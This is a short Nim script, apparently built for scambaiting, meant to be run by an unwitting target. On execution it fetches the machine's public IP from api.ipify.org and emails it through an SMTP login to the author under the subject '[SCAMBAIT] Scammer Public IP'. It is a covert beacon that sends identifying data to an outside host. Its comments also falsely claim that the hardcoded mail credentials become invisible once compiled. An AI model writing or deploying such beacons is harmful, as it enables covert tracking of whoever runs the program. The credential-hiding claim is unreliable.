import httpclient
when not defined(ssl): {.fatal: "Needs SSL, Compile with: nim c -d:ssl file.nim".}
import smtp


const
  mailUsername = "mailUsername"           # Wont be visible (will be binary).
  mailPassword = "mailPassword"           # Wont be visible (will be binary).
  mailHosting = "gmail.com"               # Wont be visible (will be binary).
  title = "[SCAMBAIT] Scammer Public IP"  # Mail Subject Title.
  mailAddresses = @["foo@gmail.com"]      # Can be more than 1.


let
  ip = newHttpClient(userAgent="", timeout=5000).getContent("http://api.ipify.org")
  message = createMessage(title, ip, mailAddresses)
  smtpConn = newSmtp(useSsl = true, debug = true)

smtpConn.connect("smtp." & mailHosting, Port(2525))
smtpConn.auth(mailUsername, mailPassword)
smtpConn.sendmail(mailUsername & "@" & mailHosting, mailAddresses, $message)
